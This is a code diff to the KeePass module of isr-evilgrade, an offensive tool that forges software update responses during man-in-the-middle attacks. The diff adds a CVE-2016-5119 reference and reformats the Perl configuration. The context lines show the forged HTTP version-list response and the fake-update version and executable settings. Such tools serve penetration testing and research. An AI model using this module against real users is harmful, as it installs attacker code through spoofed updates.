@@ -3,6 +3,10 @@
 #
 # Copyright 2016 Matias Ariel Re Medina
 #
+# Info
+# CVE-2016-5119:
+# https://bogner.sh/2016/03/mitm-attack-against-keepass-2s-update-check/
+#
 # This file is part of isr-evilgrade, www.infobytesec.com .
 #
 # isr-evilgrade is free software; you can redistribute it and/or modify
@@ -26,10 +30,10 @@ use strict;
 use Data::Dump qw(dump);
 
 my $base = {
-    'name'    => 'keepass',
-    'version' => '1.0',
-    'appver'  => 'All',
-    'author'  => ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>'],
+    'name'        => 'keepass',
+    'version'     => '1.0',
+    'appver'      => 'All',
+    'author'      => ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>'],
     'description' => qq{Keepass updater.},
     'vh'          => 'keepass.info',
     'request'     => [
@@ -44,8 +48,7 @@ my $base = {
                 . "Accept-Ranges: bytes\r\n"
                 . "Content-Length: 482 \r\n"
                 . "Connection: close \r\n"
-                . "Content-Type: text/plain\r\n\r\n"
-                .":
+                . "Content-Type: text/plain\r\n\r\n" . ":
 KeePass:<%VERSION%>
 ArcFour Cipher Plugin:2.0.9
 CodeWallet3ImportPlugin:1
@@ -71,7 +74,7 @@ SpmImport:1.2
 WinKee:2.28.0.1
 :",
         },
-        {   'req' => 'sflogo\.php\?group_id=\d+&type=\d+',   #regex friendly
+        {   'req' => 'sflogo\.php\?group_id=\d+&type=\d+',    #regex friendly
             'type'    => 'string',                  #file|string|agent|install
             'method'  => '',                        #any
             'bin'     => 0,
@@ -104,8 +107,9 @@ WinKee:2.28.0.1
             'desc' => 'Status'
         },
         'version' => {
-            'val'  => '3.12',
-            'desc' => 'Version, has to be older than target. No more than 3 digits.'
+            'val' => '3.12',
+            'desc' =>
+                'Version, has to be older than target. No more than 3 digits.'
         },
         'exename' => {
             'val'  => 'KeePass-3.12',
